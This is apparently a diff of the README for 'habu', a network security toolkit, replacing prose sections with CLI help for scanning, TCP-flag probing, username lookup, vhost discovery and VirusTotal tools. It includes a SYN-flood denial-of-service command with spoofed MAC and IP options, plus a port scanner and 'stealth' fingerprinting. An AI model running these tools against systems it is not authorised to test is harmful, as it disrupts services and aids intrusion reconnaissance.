-
-With the next command, you see all the possible combinations that have
-the FIN (F) flag set and generates a response that contains the RST (R)
-flag.
-
-``` {.sourceCode .bash}
-$ sudo habu.tcpflags -f F -r R www.portantier.com
-FPA  -> R       
-FSPA -> R       
-FAU  -> R     
-```
-
-## habu.usercheck: Check username on social networks
-
-This command checks if the given username exists on various social 
-networks and other popular sites.
-
-``` {.sourceCode .bash}
-$ habu.usercheck portantier
-{
-    "aboutme": "https://about.me/portantier",
-    "disqus": "https://disqus.com/by/portantier/",
-    "github": "https://github.com/portantier/",
-    "ifttt": "https://ifttt.com/p/portantier",
-    "lastfm": "https://www.last.fm/user/portantier",
-    "medium": "https://medium.com/@portantier",
-    "pastebin": "https://pastebin.com/u/portantier",
-    "pinterest": "https://in.pinterest.com/portantier/",
-    "twitter": "https://twitter.com/portantier",
-    "vimeo": "https://vimeo.com/portantier"
-}
-```
-
-## habu.virustotal: VirusTotal API client
-
-This command sends a file to VirusTotal <https://www.virustotal.com/> and 
-prints the report in JSON format.
-
-**Note:** Before send a file, habu will check if the file has been analyzed 
-before (sending the sha256 of the file to VirusTotal), if a report exists, 
-no submission will be made, and you will see the last report.
-
-``` {.sourceCode .bash}
-$ habu.virustotal meterpreter.exe
-
-{
-    "md5": "0ddb015b5328eb4d0cc2b87c39c49686",
-    "permalink": "https://www.virustotal.com/file/c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23/analysis/1526850717/",
-    "positives": 49,
-    "resource": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
-    "response_code": 1,
-    "scan_date": "2018-05-20 21:11:57",
-    "scan_id": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23-1526850717",
-    "scans": {
-        "ALYac": {
-            "detected": true,
-            "result": "Trojan.CryptZ.Gen",
-            "update": "20180520",
-            "version": "1.1.1.5"
-        },
-        ... The other scanners ...
-    },
-    "sha1": "5fa33cab1729480dd023b08f7b91a945c16d0a9e",
-    "sha256": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
-    "total": 67,
-    "verbose_msg": "Scan finished, information embedded"
-}
 ```
 
 
-## habu.vhosts: Get vhosts of an IP address
+## habu.shodan
 
-This command uses Bing to query the websites hosted on the same IP
-address.
 
 ``` {.sourceCode .bash}
-$ habu.vhosts www.telefonica.com
-www.telefonica.com -> 212.170.36.79
-[
-    'www.telefonica.es',
-    'universitas.telefonica.com',
-    'www.telefonica.com',
-]
+Usage: habu.shodan [OPTIONS] IP
+
+  Simple shodan API client.
+
+  Prints the JSON result of a shodan query.
+
+  Example:
+
+  $ habu.shodan 8.8.8.8
+  {
+      "hostnames": [
+          "google-public-dns-a.google.com"
+      ],
+      "country_code": "US",
+      "org": "Google",
+      "data": [
+          {
+              "isp": "Google",
+              "transport": "udp",
+              "data": "Recursion: enabled",
+              "asn": "AS15169",
+              "port": 53,
+              "hostnames": [
+                  "google-public-dns-a.google.com"
+              ]
+          }
+      ],
+      "ports": [
+          53
+      ]
+  }
+
+Options:
+  -c           Disable cache
+  -v           Verbose output
+  -o FILENAME  Output file (default: stdout)
+  --help       Show this message and exit.
 ```
 
-## habu.webid: Identify Web Technologies
 
-This command uses Wappalyzer apps.json database to identify technologies
-used on a web application.
+## habu.synflood
 
-More info about Wappalyzer: <https://github.com/AliasIO/Wappalyzer/>
-
-**Note:** This tool only sends one request. So, it's stealth and not
-suspicious.
 
 ``` {.sourceCode .bash}
-$ habu.webid https://woocomerce.com
-{
-    "Nginx": {
-        "categories": [
-            "Web Servers"
-        ]
-    },
-    "PHP": {
-        "categories": [
-            "Programming Languages"
-        ]
-    },
-    "WooCommerce": {
-        "categories": [
-            "Ecommerce"
-        ],
-        "version": "6.3.1"
-    },
-    "WordPress": {
-        "categories": [
-            "CMS",
-            "Blogs"
-        ]
-    },
-}
+Usage: habu.synflood [OPTIONS] IP
+
+  Launch a lot of TCP connections and keeps them opened.
+
+  Some very old systems can suffer a Denial of Service with this.
+
+  Reference: https://en.wikipedia.org/wiki/SYN_flood
+
+  Example:
+
+  # sudo habu.synflood 172.16.0.10
+  .................
+
+  Each dot is a packet sent.
+
+  You can use the options '-2' and '-3' to forge the layer 2/3 addresses.
+
+  If you use them, each connection will be sent from a random layer2 (MAC)
+  and/or layer3 (IP) address.
+
+  You can choose the number of connections to create with the option '-c'.
+  The default is never stop creating connections.
+
+  Note: If you send the packets from your real IP address and you want to
+  keep the connections half-open, you need to setup for firewall to don't
+  send the RST packets.
+
+Options:
+  -i TEXT     Wich interface to use (default: auto)
+  -c INTEGER  How many packets send (default: infinit)
+  -p INTEGER  Port to use (default: 135)
+  -2          Forge layer2/MAC address (default: No)
+  -3          Forge layer3/IP address (default: No)
+  -v          Verbose
+  --help      Show this message and exit.
+```
+
+
+## habu.tcpflags
+
+
+``` {.sourceCode .bash}
+Usage: habu.tcpflags [OPTIONS] IP
+
+  Send TCP packets with different flags and tell what responses receives.
+
+  It can be used to analyze how the different TCP/IP stack implementations
+  and configurations responds to packet with various flag combinations.
+
+  Example:
+
+  # habu.tcpflags www.portantier.com
+  S  -> SA
+  FS -> SA
+  FA -> R
+  SA -> R
+
+  By default, the command sends all possible flag combinations. You can
+  specify which flags must ever be present (reducing the quantity of
+  possible combinations), with the option '-f'.
+
+  Also, you can specify which flags you want to be present on the response
+  packets to show, with the option '-r'.
+
+  With the next command, you see all the possible combinations that have the
+  FIN (F) flag set and generates a response that contains the RST (R) flag.
+
+  Example:
+
+  # habu.tcpflags -f F -r R www.portantier.com
+  FPA  -> R
+  FSPA -> R
+  FAU  -> R
+
+Options:
+  -p INTEGER  Port to use (default: 80)
+  -f TEXT     Flags that must be sent ever (default: fuzz with all flags)
+  -r TEXT     Filter by response flags (default: show all responses)
+  -v          Verbose
+  --help      Show this message and exit.
+```
+
+
+## habu.tcpscan
+
+
+``` {.sourceCode .bash}
+Usage: habu.tcpscan [OPTIONS] IP
+
+  TCP Port Scanner.
+
+  Print the ports that generated a response with the SYN flag or (if show
+  use -a) all the ports that generated a response.
+
+  It's really basic compared with nmap, but who is comparing?
+
+  Example:
+
+  # habu.tcpscan -p 22,23,80,443 -s 1 45.77.113.133
+  22 S -> SA
+  80 S -> SA
+  443 S -> SA
+
+Options:
+  -p TEXT     Ports to use (default: 80) example: 20-23,80,135
+  -i TEXT     Interface to use
+  -f TEXT     Flags to use (default: S)
+  -s TEXT     Time between probes (default: send all together)
+  -t INTEGER  Timeout for each probe (default: 2 seconds)
+  -a          Show all responses (default: Only containing SYN flag)
+  -v          Verbose output
+  --help      Show this message and exit.
+```
+
+
+## habu.traceroute
+
+
+``` {.sourceCode .bash}
+Usage: habu.traceroute [OPTIONS] IP
+
+  TCP traceroute.
+
+  Identify the path to a destination getting the ttl-zero-during-transit
+  messages.
+
+  Note: On the internet, you can have various valid paths to a device.
+
+  Example:
+
+  # habu.traceroute 45.77.113.133
+  IP / ICMP 192.168.0.1 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror
+  IP / ICMP 10.242.4.197 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror / Padding
+  IP / ICMP 200.32.127.98 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror / Padding
+  .
+  IP / ICMP 4.16.180.190 > 192.168.0.5 time-exceeded ttl-zero-during-transit / IPerror / TCPerror
+  .
+  IP / TCP 45.77.113.133:http > 192.168.0.5:ftp_data SA / Padding
+
+  Note: It's better if you use a port that is open on the remote system.
+
+Options:
+  -p INTEGER  Port to use (default: 80)
+  -i TEXT     Interface to use
+  --help      Show this message and exit.
+```
+
+
+## habu.usercheck
+
+
+``` {.sourceCode .bash}
+Usage: habu.usercheck [OPTIONS] USERNAME
+
+  Check if the given username exists on various social networks and other
+  popular sites.
+
+  $ habu.usercheck portantier
+  {
+      "aboutme": "https://about.me/portantier",
+      "disqus": "https://disqus.com/by/portantier/",
+      "github": "https://github.com/portantier/",
+      "ifttt": "https://ifttt.com/p/portantier",
+      "lastfm": "https://www.last.fm/user/portantier",
+      "medium": "https://medium.com/@portantier",
+      "pastebin": "https://pastebin.com/u/portantier",
+      "pinterest": "https://in.pinterest.com/portantier/",
+      "twitter": "https://twitter.com/portantier",
+      "vimeo": "https://vimeo.com/portantier"
+  }
+
+Options:
+  -c      Disable cache
+  -v      Verbose output
+  -w      Open each valid url in a webbrowser
+  --help  Show this message and exit.
+```
+
+
+## habu.vhosts
+
+
+``` {.sourceCode .bash}
+Usage: habu.vhosts [OPTIONS] HOST
+
+  Use Bing to query the websites hosted on the same IP address.
+
+  $ habu.vhosts www.telefonica.com
+  www.telefonica.com -> 212.170.36.79
+  [
+      'www.telefonica.es',
+      'universitas.telefonica.com',
+      'www.telefonica.com',
+  ]
+
+Options:
+  -c          Disable cache
+  -p INTEGER  Pages count (Default: 10)
+  -f INTEGER  First result to get (Default: 1)
+  --help      Show this message and exit.
+```
+
+
+## habu.virustotal
+
+
+``` {.sourceCode .bash}
+Usage: habu.virustotal [OPTIONS] INPUT
+
+  Send a file to VirusTotal https://www.virustotal.com/ and print the report
+  in JSON format.
+
+  Note: Before send a file, will check if the file has been analyzed before
+  (sending the sha256 of the file), if a report exists, no submission will
+  be made, and you will see the last report.
+
+  $ habu.virustotal meterpreter.exe
+  Verifying if hash already submitted: f4826b219aed3ffdaa23db26cfae611979bf215984fc71a1c12f6397900cb70d
+  Sending file for analysis
+  Waiting/retrieving the report...
+  {
+      "md5": "0ddb015b5328eb4d0cc2b87c39c49686",
+      "permalink": "https://www.virustotal.com/file/c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23/analysis/1526850717/",
+      "positives": 49,
+      "resource": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
+      "response_code": 1,
+      "scan_date": "2018-05-20 21:11:57",
+      "scan_id": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23-1526850717",
+      "scans": {
+          "ALYac": {
+              "detected": true,
+              "result": "Trojan.CryptZ.Gen",
+              "update": "20180520",
+              "version": "1.1.1.5"
+          },
+          ... The other scanners ...
+      },
+      "sha1": "5fa33cab1729480dd023b08f7b91a945c16d0a9e",
+      "sha256": "c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23",
+      "total": 67,
+      "verbose_msg": "Scan finished, information embedded"
+  }
+
+Options:
+  -v      Verbose output
+  --help  Show this message and exit.
+```
+
+
+## habu.webid
+
+
+``` {.sourceCode .bash}
+Usage: habu.webid [OPTIONS] URL
+
+  Use Wappalyzer apps.json database to identify technologies used on a web
+  application.
+
+  Reference: https://github.com/AliasIO/Wappalyzer
+
+  Note: This tool only sends one request. So, it's stealth and not
+  suspicious.
+
+  $ habu.webid https://woocomerce.com
+  {
+      "Nginx": {
+          "categories": [
+              "Web Servers"
+          ]
+      },
+      "PHP": {
+          "categories": [
+              "Programming Languages"
+          ]
+      },
+      "WooCommerce": {
+          "categories": [
+              "Ecommerce"
+          ],
+          "version": "6.3.1"
+      },
+      "WordPress": {
+          "categories": [
+              "CMS",
+              "Blogs"
+          ]
+      },
+  }
+
+Options:
+  -c      Disable cache
+  -v      Verbose output
+  --help  Show this message and exit.
+```
+
+
+## habu.xor
+
+
+``` {.sourceCode .bash}
+Usage: habu.xor [OPTIONS]
+
+  XOR cipher.
+
+  Note: XOR is not a 'secure cipher'. If you need strong crypto you must use
+  algorithms like AES.
+
+  Example:
+
+  $ habu.xor -k mysecretkey -i /bin/ls > xored
+  $ habu.xor -k mysecretkey -i xored > uxored
+  $ sha1sum /bin/ls uxored
+  $ 6fcf930fcee1395a1c95f87dd38413e02deff4bb  /bin/ls
+  $ 6fcf930fcee1395a1c95f87dd38413e02deff4bb  uxored
+
+Options:
+  -k TEXT      Encryption key
+  -i FILENAME  Input file
+  -o FILENAME  Output file
+  --help       Show this message and exit.
 ```
